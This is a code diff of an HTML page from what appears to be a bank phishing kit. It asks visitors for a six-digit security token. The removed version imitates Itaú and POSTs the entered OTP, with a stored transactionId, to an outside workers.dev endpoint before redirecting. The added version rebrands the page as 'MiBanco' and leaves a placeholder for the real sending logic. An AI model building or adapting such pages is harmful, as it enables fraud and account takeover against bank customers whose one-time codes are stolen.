@@ -1,531 +1,453 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#06143f">
-<title>Itaú - Código de validación</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta name="theme-color" content="#ffffff">
+    <title>Token de verificación</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
 
-body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-    background: #f8f9fa;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-}
+        .container {
+            max-width: 420px;
+            width: 100%;
+            background: white;
+            border-radius: 12px;
+            padding: 32px 28px 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
 
-.header {
-    background: #06143f;
-    padding: 18px 24px;
-    display: flex;
-    align-items: center;
-    gap: 16px;
-    min-height: 72px;
-}
+        .logo-container {
+            margin-bottom: 20px;
+        }
 
-.header .back {
-    color: #fff;
-    font-size: 28px;
-    cursor: pointer;
-    text-decoration: none;
-    font-weight: 300;
-    line-height: 1;
-}
+        .logo-placeholder {
+            width: 140px;
+            height: 50px;
+            margin: 0 auto;
+            background: #ff6a00;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
 
-.header .back:hover {
-    opacity: 0.8;
-}
+        h1 {
+            color: #555;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
 
-.header .logo {
-    color: #fff;
-    font-size: 22px;
-    font-weight: 700;
-    letter-spacing: -1px;
-}
+        .subtitle {
+            color: #777;
+            font-size: 12px;
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
 
-.header .title {
-    color: #fff;
-    font-size: 18px;
-    font-weight: 400;
-    margin-left: auto;
-}
+        .input-wrapper {
+            margin: 20px 0 16px;
+        }
 
-.container {
-    flex: 1;
-    padding: 40px 24px 120px;
-    max-width: 420px;
-    margin: 0 auto;
-    width: 100%;
-    text-align: center;
-}
+        .token-input {
+            width: 100%;
+            max-width: 260px;
+            padding: 14px 16px;
+            font-size: 20px;
+            font-weight: 500;
+            text-align: center;
+            letter-spacing: 8px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.3s;
+            background: #fafafa;
+            font-family: 'Courier New', monospace;
+        }
 
-.code-boxes {
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    margin: 30px 0 25px;
-}
+        .token-input:focus {
+            border-color: #ff6a00;
+            background: white;
+        }
 
-.box {
-    width: 50px;
-    height: 60px;
-    border-radius: 12px;
-    background: #f0f0f5;
-    border: 2px solid #e0e0e5;
-    font-size: 24px;
-    font-weight: 600;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #06143f;
-    transition: all 0.3s;
-    font-family: 'Courier New', monospace;
-}
+        .token-input::placeholder {
+            letter-spacing: 2px;
+            font-size: 13px;
+            color: #aaa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
 
-.box.active {
-    border-color: #ff5b00;
-    background: #fff;
-    box-shadow: 0 0 0 3px rgba(255, 91, 0, 0.15);
-}
+        .error-msg {
+            color: #dc3545;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+        }
 
-.box.filled {
-    border-color: #28a745;
-    background: #f0fff4;
-}
+        .error-msg.show {
+            display: block;
+        }
 
-.box.error {
-    border-color: #dc3545;
-    background: #fff5f5;
-    animation: shake 0.3s ease;
-}
+        .help-box {
+            text-align: left;
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 14px 18px;
+            margin: 18px 0 22px;
+            border-left: 3px solid #ff6a00;
+        }
 
-@keyframes shake {
-    0%, 100% { transform: translateX(0); }
-    25% { transform: translateX(-8px); }
-    75% { transform: translateX(8px); }
-}
+        .help-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
 
-.text {
-    color: #6c757d;
-    font-size: 14px;
-    line-height: 1.6;
-    margin-top: 20px;
-}
+        .help-text {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.8;
+        }
 
-#claveInput {
-    position: absolute;
-    opacity: 0;
-    width: 1px;
-    height: 1px;
-    pointer-events: none;
-}
+        .help-text strong {
+            color: #333;
+        }
 
-.keyboard {
-    position: fixed;
-    bottom: 0;
-    left: 0;
-    right: 0;
-    background: white;
-    padding: 16px 0 30px;
-    border-top: 1px solid #e9ecef;
-    box-shadow: 0 -4px 20px rgba(0,0,0,0.05);
-}
+        .btn-confirm {
+            width: 100%;
+            max-width: 260px;
+            padding: 14px;
+            background: #ccc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
 
-.keys {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 12px;
-    max-width: 320px;
-    margin: 0 auto;
-    padding: 0 16px;
-}
+        .btn-confirm.active {
+            background: #ff6a00;
+        }
 
-.key {
-    font-size: 24px;
-    font-weight: 500;
-    text-align: center;
-    padding: 14px 0;
-    cursor: pointer;
-    border-radius: 12px;
-    background: #f8f9fa;
-    color: #06143f;
-    transition: all 0.15s;
-    user-select: none;
-    -webkit-tap-highlight-color: transparent;
-    touch-action: manipulation;
-}
+        .btn-confirm.active:hover {
+            background: #e85e00;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 15px rgba(255, 106, 0, 0.3);
+        }
 
-.key:hover {
-    background: #e9ecef;
-}
+        .btn-confirm.active:active {
+            transform: translateY(0);
+        }
 
-.key:active {
-    transform: scale(0.92);
-    background: #ff5b00;
-    color: white;
-}
+        /* Loading Overlay */
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.5);
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
 
-.key.empty {
-    background: transparent;
-    cursor: default;
-    pointer-events: none;
-}
+        .loading-container {
+            background: white;
+            padding: 36px 44px;
+            border-radius: 14px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
 
-.key.delete {
-    font-size: 20px;
-    color: #dc3545;
-}
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #ff6a00;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 14px;
+        }
 
-.key.delete:active {
-    background: #dc3545;
-    color: white;
-}
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
 
-.alert-overlay {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0,0,0,0.5);
-    z-index: 1000;
-    justify-content: center;
-    align-items: center;
-    animation: fadeIn 0.3s ease;
-}
+        .loading-text {
+            color: #333;
+            font-size: 15px;
+            font-weight: 500;
+        }
 
-.alert-box {
-    background: white;
-    border-radius: 20px;
-    padding: 30px 32px 24px;
-    max-width: 380px;
-    width: 90%;
-    text-align: center;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-    animation: slideUp 0.3s ease;
-}
+        .loading-sub {
+            color: #888;
+            font-size: 12px;
+            margin-top: 4px;
+        }
 
-.alert-icon {
-    font-size: 48px;
-    margin-bottom: 12px;
-}
+        /* Alert Overlay */
+        .alert-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+        }
 
-.alert-title {
-    font-size: 20px;
-    font-weight: 700;
-    color: #dc3545;
-    margin-bottom: 8px;
-}
+        .alert-box {
+            background: white;
+            border-radius: 14px;
+            padding: 28px 24px 24px;
+            max-width: 320px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
 
-.alert-message {
-    font-size: 15px;
-    color: #6c757d;
-    line-height: 1.5;
-    margin-bottom: 20px;
-}
+        .alert-icon {
+            font-size: 44px;
+            margin-bottom: 6px;
+        }
 
-.alert-btn {
-    background: #ff5b00;
-    color: white;
-    border: none;
-    padding: 12px 40px;
-    border-radius: 12px;
-    font-size: 16px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: opacity 0.3s;
-}
+        .alert-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
 
-.alert-btn:hover {
-    opacity: 0.9;
-}
+        .alert-message {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 18px;
+        }
 
-@keyframes fadeIn {
-    from { opacity: 0; }
-    to { opacity: 1; }
-}
+        .alert-btn {
+            background: #ff6a00;
+            color: white;
+            border: none;
+            padding: 10px 36px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
 
-@keyframes slideUp {
-    from { transform: translateY(30px); opacity: 0; }
-    to { transform: translateY(0); opacity: 1; }
-}
+        .alert-btn:hover {
+            background: #e85e00;
+        }
 
-@media (max-width: 480px) {
-    .header {
-        padding: 14px 18px;
-        min-height: 60px;
-    }
-    .header .logo {
-        font-size: 18px;
-    }
-    .header .title {
-        font-size: 15px;
-    }
-    .container {
-        padding: 30px 16px 140px;
-    }
-    .code-boxes {
-        gap: 10px;
-    }
-    .box {
-        width: 44px;
-        height: 54px;
-        font-size: 20px;
-        border-radius: 10px;
-    }
-    .keys {
-        gap: 10px;
-        max-width: 280px;
-    }
-    .key {
-        font-size: 21px;
-        padding: 12px 0;
-        border-radius: 10px;
-    }
-}
-
-@media (max-width: 380px) {
-    .box {
-        width: 38px;
-        height: 46px;
-        font-size: 17px;
-        border-radius: 8px;
-    }
-    .code-boxes {
-        gap: 8px;
-    }
-    .keys {
-        gap: 8px;
-        max-width: 240px;
-    }
-    .key {
-        font-size: 18px;
-        padding: 10px 0;
-    }
-}
-</style>
+        @media (max-width: 480px) {
+            body {
+                padding: 12px;
+            }
+            .container {
+                padding: 24px 16px 32px;
+                border-radius: 10px;
+            }
+            .logo-placeholder {
+                width: 110px;
+                height: 42px;
+                font-size: 20px;
+            }
+            h1 {
+                font-size: 18px;
+            }
+            .token-input {
+                font-size: 18px;
+                padding: 12px 14px;
+                max-width: 220px;
+            }
+            .btn-confirm {
+                padding: 12px;
+                font-size: 14px;
+                max-width: 220px;
+            }
+            .help-box {
+                padding: 12px 14px;
+            }
+            .loading-container {
+                padding: 28px 24px;
+                margin: 0 16px;
+            }
+        }
+    </style>
 </head>
 <body>
 
-<div class="alert-overlay" id="alertOverlay">
-    <div class="alert-box">
-        <div class="alert-icon">❌</div>
-        <div class="alert-title">Código incorrecto</div>
-        <div class="alert-message">El código ingresado no es válido. Por favor, intenta nuevamente.</div>
-        <button class="alert-btn" onclick="cerrarAlerta()">Intentar de nuevo</button>
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <div class="logo-placeholder">MiBanco</div>
+        </div>
+
+        <h1>Ingresa el código Token</h1>
+        <p class="subtitle">
+            Genera el código Token de 6 dígitos en la App.<br>
+            Luego ingrésalo en esta pantalla.
+        </p>
+
+        <div class="input-wrapper">
+            <input 
+                type="text"
+                class="token-input"
+                id="tokencode"
+                maxlength="6"
+                placeholder="Token (6 dígitos)"
+                autofocus
+            >
+            <div class="error-msg" id="errorMsg">⚠️ Ingresá exactamente 6 dígitos numéricos</div>
+        </div>
+
+        <div class="help-box">
+            <div class="help-title">📱 ¿Cómo obtener el código Token?</div>
+            <div class="help-text">
+                <strong>1.</strong> Ingresá a la App<br>
+                <strong>2.</strong> Presioná el botón <strong>"Token"</strong> en la pantalla de ingreso
+            </div>
+        </div>
+
+        <button class="btn-confirm" id="continueBtn" disabled>CONFIRMAR</button>
     </div>
-</div>
 
-<div class="header">
-    <span class="back" onclick="window.history.back()">‹</span>
-    <span class="logo">itaú</span>
-    <span class="title">Código de validación</span>
-</div>
-
-<div class="container">
-    <div class="code-boxes" id="boxes"></div>
-    <div class="text">
-       Por seguridad ingrese su token para poder validar su identidad.
+    <!-- Loading -->
+    <div id="loadingOverlay">
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <div class="loading-text">Verificando código...</div>
+            <div class="loading-sub">Por favor, esperá un momento</div>
+        </div>
     </div>
-    <input type="password" id="claveInput" maxlength="6" inputmode="numeric" autofocus>
-</div>
 
-<div class="keyboard">
-    <div class="keys">
-        <div class="key" data-value="1">1</div>
-        <div class="key" data-value="2">2</div>
-        <div class="key" data-value="3">3</div>
-        <div class="key" data-value="4">4</div>
-        <div class="key" data-value="5">5</div>
-        <div class="key" data-value="6">6</div>
-        <div class="key" data-value="7">7</div>
-        <div class="key" data-value="8">8</div>
-        <div class="key" data-value="9">9</div>
-        <div class="key empty"></div>
-        <div class="key" data-value="0">0</div>
-        <div class="key delete" data-value="delete">⌫</div>
+    <!-- Alert -->
+    <div class="alert-overlay" id="alertOverlay">
+        <div class="alert-box">
+            <div class="alert-icon">❌</div>
+            <div class="alert-title">Código incorrecto</div>
+            <div class="alert-message">El token ingresado no es válido. Por favor, intentá nuevamente.</div>
+            <button class="alert-btn" onclick="cerrarAlerta()">Reintentar</button>
+        </div>
     </div>
-</div>
 
-<script>
-// ✅ TU WORKER CORRECTO
-const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';
+    <script>
+        const input = document.getElementById('tokencode');
+        const button = document.getElementById('continueBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const alertOverlay = document.getElementById('alertOverlay');
 
-const claveInput = document.getElementById('claveInput');
-const boxesContainer = document.getElementById('boxes');
-const alertOverlay = document.getElementById('alertOverlay');
-
-for (let i = 0; i < 6; i++) {
-    const div = document.createElement('div');
-    div.classList.add('box');
-    boxesContainer.appendChild(div);
-}
-const boxes = document.querySelectorAll('.box');
-
-function mostrarAlerta() {
-    alertOverlay.style.display = 'flex';
-}
-
-function cerrarAlerta() {
-    alertOverlay.style.display = 'none';
-    claveInput.value = '';
-    updateBoxes();
-    setTimeout(() => claveInput.focus(), 100);
-}
-
-function updateBoxes() {
-    const val = claveInput.value;
-    boxes.forEach((box, i) => {
-        if (val[i]) {
-            box.textContent = '•';
-            box.classList.add('filled');
-            box.classList.remove('active');
-            box.classList.remove('error');
-        } else {
-            box.textContent = '';
-            box.classList.remove('filled');
-            box.classList.remove('error');
-            if (i === val.length) {
-                box.classList.add('active');
+        function updateButton() {
+            const value = input.value.trim();
+            if (/^\d{6}$/.test(value)) {
+                button.disabled = false;
+                button.classList.add('active');
+                errorMsg.classList.remove('show');
             } else {
-                box.classList.remove('active');
+                button.disabled = true;
+                button.classList.remove('active');
             }
         }
-    });
-}
 
-function mostrarErrorCajas() {
-    boxes.forEach((box) => box.classList.add('error'));
-    setTimeout(() => {
-        boxes.forEach((box) => box.classList.remove('error'));
-    }, 500);
-}
-
-function agregarNumero(numero) {
-    if (claveInput.value.length < 6) {
-        claveInput.value += numero;
-        claveInput.dispatchEvent(new Event('input'));
-    }
-}
-
-function borrarNumero() {
-    claveInput.value = claveInput.value.slice(0, -1);
-    claveInput.dispatchEvent(new Event('input'));
-}
-
-// ========================= ENVIAR CÓDIGO OTP =========================
-async function enviarCodigo() {
-    const claveValue = claveInput.value.trim();
-    if (claveValue.length !== 6) return;
-
-    try {
-        const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-        const transactionId = bancoldata.transactionId;
-
-        if (!transactionId) {
-            alert('Error: Sesión no encontrada');
-            window.location.href = 'index.html';
-            return;
-        }
-
-        console.log('📤 Enviando código OTP:', claveValue);
-        console.log('🆔 TransactionId:', transactionId);
-        console.log(`📡 Worker URL: ${WORKER_URL}`);
-
-        // ✅ Enviar al endpoint /otp-code
-        const response = await fetch(`${WORKER_URL}/otp-code`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                transactionId: transactionId,
-                otp: claveValue
-            })
+        input.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value.length > 6) {
+                this.value = this.value.slice(0, 6);
+            }
+            updateButton();
         });
 
-        const result = await response.json();
+        button.addEventListener('click', function(e) {
+            e.preventDefault();
+            const token = input.value.trim();
 
-        if (result.ok) {
-            // ✅ Redirigir a validacion.html
-            window.location.href = 'validacion.html';
-        } else {
-            mostrarErrorCajas();
-            mostrarAlerta();
+            if (!/^\d{6}$/.test(token)) {
+                errorMsg.classList.add('show');
+                return;
+            }
+
+            errorMsg.classList.remove('show');
+
+            document.getElementById('loadingOverlay').style.display = 'flex';
+
+            // Simular envío - CAMBIAR POR TU LÓGICA REAL
+            setTimeout(function() {
+                document.getElementById('loadingOverlay').style.display = 'none';
+
+                // Simular respuesta (cambiar por tu lógica)
+                const success = Math.random() > 0.3;
+
+                if (success) {
+                    window.location.href = 'validacion.html';
+                } else {
+                    alertOverlay.style.display = 'flex';
+                    input.value = '';
+                    updateButton();
+                }
+            }, 2000);
+        });
+
+        function cerrarAlerta() {
+            alertOverlay.style.display = 'none';
+            input.focus();
         }
 
-    } catch (err) {
-        console.error('❌ Error:', err);
-        mostrarErrorCajas();
-        mostrarAlerta();
-    }
-}
+        // Teclado físico
+        document.addEventListener('keydown', function(e) {
+            if (e.key >= '0' && e.key <= '9') {
+                if (input.value.length < 6) {
+                    input.value += e.key;
+                    input.dispatchEvent(new Event('input'));
+                }
+                e.preventDefault();
+            } else if (e.key === 'Backspace') {
+                input.value = input.value.slice(0, -1);
+                input.dispatchEvent(new Event('input'));
+                e.preventDefault();
+            } else if (e.key === 'Enter') {
+                if (!button.disabled) {
+                    button.click();
+                }
+                e.preventDefault();
+            }
+        });
 
-// ========================= EVENTOS =========================
-claveInput.addEventListener('input', () => {
-    if (claveInput.value.length > 6) {
-        claveInput.value = claveInput.value.slice(0, 6);
-    }
-    updateBoxes();
-    if (claveInput.value.length === 6) {
-        setTimeout(enviarCodigo, 300);
-    }
-});
-
-document.querySelectorAll('.key').forEach(key => {
-    key.addEventListener('click', function(e) {
-        e.preventDefault();
-        const value = this.dataset.value;
-        if (value === 'delete') {
-            borrarNumero();
-        } else if (value) {
-            agregarNumero(value);
-        }
-    });
-
-    key.addEventListener('touchstart', function(e) {
-        e.preventDefault();
-        const value = this.dataset.value;
-        if (value === 'delete') {
-            borrarNumero();
-        } else if (value) {
-            agregarNumero(value);
-        }
-    }, { passive: false });
-});
-
-updateBoxes();
-setTimeout(() => claveInput.focus(), 300);
-
-console.log('🚀 Sistema de validación Itaú listo');
-console.log(`📡 Worker URL: ${WORKER_URL}`);
-
-document.addEventListener('keydown', (e) => {
-    if (e.key >= '0' && e.key <= '9') {
-        if (claveInput.value.length < 6) {
-            claveInput.value += e.key;
-            claveInput.dispatchEvent(new Event('input'));
-        }
-        e.preventDefault();
-    } else if (e.key === 'Backspace') {
-        claveInput.value = claveInput.value.slice(0, -1);
-        claveInput.dispatchEvent(new Event('input'));
-        e.preventDefault();
-    }
-});
-
-document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape' && alertOverlay.style.display === 'flex') {
-        cerrarAlerta();
-    }
-});
-</script>
+        updateButton();
+    </script>
 
 </body>
 </html>
